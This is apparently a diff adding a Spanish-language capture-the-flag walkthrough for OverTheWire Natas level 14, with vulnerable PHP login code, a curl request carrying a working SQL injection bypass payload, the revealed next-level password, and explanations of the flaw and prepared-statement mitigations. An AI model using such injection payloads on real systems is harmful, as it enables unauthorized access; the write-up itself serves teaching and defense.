@@ -1495,3 +1495,112 @@ Unrestricted File Upload que deriva en Remote Code Execution (RCE), combinado co
 - El backend debe generar e imponer su propia extensión permitida (como `.jpg`) basándose estrictamente en el tipo de archivo validado, descartando por completo extensiones peligrosas suministradas por el usuario (como `.php`).
 - Bloquear la interpretación de código de scripts en el directorio de subidas (por ejemplo, con php_flag engine off en Apache o bloqueando la ejecución en Nginx) para asegurar que el archivo se sirva estrictamente como un recurso estático (descarga o visualización de imagen), sin importar su extensión.
 </Callout>
+
+## Natas Level 13 → Level 14
+
+[Natas Level 13 → Level 14](https://overthewire.org/wargames/natas/natas14.html)
+
+Al visitar el sitio web nos pide iniciar sesión. Iniciamos sesión con las credenciales obtenidas.
+
+```bash
+curl http://natas14.natas.labs.overthewire.org/ --user natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+```
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas14", "pass": "A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8" };</script></head>
+<body>
+<h1>natas14</h1>
+<div id="content">
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+```php
+<?php
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas14', '<censored>');
+    mysqli_select_db($link, 'natas14');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysqli_close($link);
+} else {
+?>
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<?php } ?>
+```
+
+```bash
+curl -X POST -d 'username=melvin" or 1=1-- -' -d 'password=melvin' http://natas14.natas.labs.overthewire.org/ --user natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+```
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas14", "pass": "A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8" };</script></head>
+<body>
+<h1>natas14</h1>
+<div id="content">
+Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+<Callout type="success" title="Password natas15">
+GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
+</Callout>
+
+<Callout type="warning" title="Vulnerabilidad">
+Se trata de una vulnerabilidad de SQL Injection (SQLi) (inyección SQL). El fallo ocurre porque la aplicación web construye la consulta SQL concatenando directamente las entradas del usuario (`$_REQUEST["username"]` y `$_REQUEST["password"]`) de forma dinámica en el string de la query. Al no aplicar ningún tipo de input sanitization ni utilizar consultas parametrizadas, el intérprete de la base de datos confunde los datos provistos por el usuario con código de comando SQL. Esto permite a un atacante alterar la lógica booleana de la consulta original para forzar al sistema a devolver filas válidas, logrando un Authentication Bypass (evasión de autenticación).
+- [**CWE-89** Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)
+- [**CWE-566** Authorization Bypass Through User-Controlled SQL Primary Key](https://cwe.mitre.org/data/definitions/566.html)
+</Callout>
+
+<Callout type="tip" title="Mitigación">
+- Utilizar Prepared Statements (Consultas Parametrizadas): Al usar Prepared Statements (con librerías como PDO o funciones nativas preparadas en mysqli), la estructura de la consulta SQL se precompila en la base de datos y los parámetros del usuario se tratan estrictamente como literales de datos, neutralizando cualquier intento de inyección de código.
+```php
+// Ejemplo de mitigación correcta:
+$stmt = $link->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();
+```
+- Si por motivos heredados no se pueden usar consultas preparadas, se debe pasar obligatoriamente cada variable por funciones que escapan los caracteres especiales de SQL, como `mysqli_real_escape_string()`, antes de concatenarla.
+- Configurar la cuenta de conexión del servidor web a la base de datos para que solo posea los permisos mínimos necesarios (por ejemplo, solo SELECT en la tabla users), limitando el impacto en caso de sufrir otra inyección.
+</Callout>
